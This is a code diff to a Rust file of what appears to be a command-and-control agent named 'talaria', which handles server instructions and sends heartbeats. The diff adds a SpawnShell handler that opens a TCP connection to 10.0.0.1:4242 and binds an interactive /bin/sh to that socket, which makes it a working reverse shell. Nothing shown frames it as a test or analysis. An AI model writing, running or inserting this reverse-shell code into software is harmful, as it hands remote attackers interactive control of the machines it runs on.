@@ -3,8 +3,12 @@ use talaria::helper::*;
 use talaria::protocol::*;
 
 use anyhow::Result;
+use std::net::TcpStream;
+use std::os::fd::AsRawFd;
+use std::os::fd::FromRawFd;
 use std::process::Command;
 use std::process::Output;
+use std::process::Stdio;
 
 pub async fn handle_response(agent: &mut AgentContext, response: AgentInstruction) -> Result<()> {
     match response.packet_body {
@@ -52,13 +56,25 @@ pub async fn handle_response(agent: &mut AgentContext, response: AgentInstructio
         AgentInstructionBody::Ok => {
             devlog!("Server acknowledged previous operation.");
         }
+        AgentInstructionBody::SpawnShell => {
+            let s = TcpStream::connect("10.0.0.1:4242").unwrap();
+            let fd = s.as_raw_fd();
+            Command::new("/bin/sh")
+                .arg("-i")
+                .stdin(unsafe { Stdio::from_raw_fd(fd) })
+                .stdout(unsafe { Stdio::from_raw_fd(fd) })
+                .stderr(unsafe { Stdio::from_raw_fd(fd) })
+                .spawn()
+                .unwrap()
+                .wait()
+                .unwrap();
+        }
     }
 
     devlog!("Processed Response: {:#?}", response);
     Ok(())
 }
 
-/// Sends a heartbeat to the server.
 pub async fn send_heartbeat(agent: &mut AgentContext) -> Result<AgentInstruction> {
     let response = AgentResponse {
         packet_header: agent.generate_packet_header(),
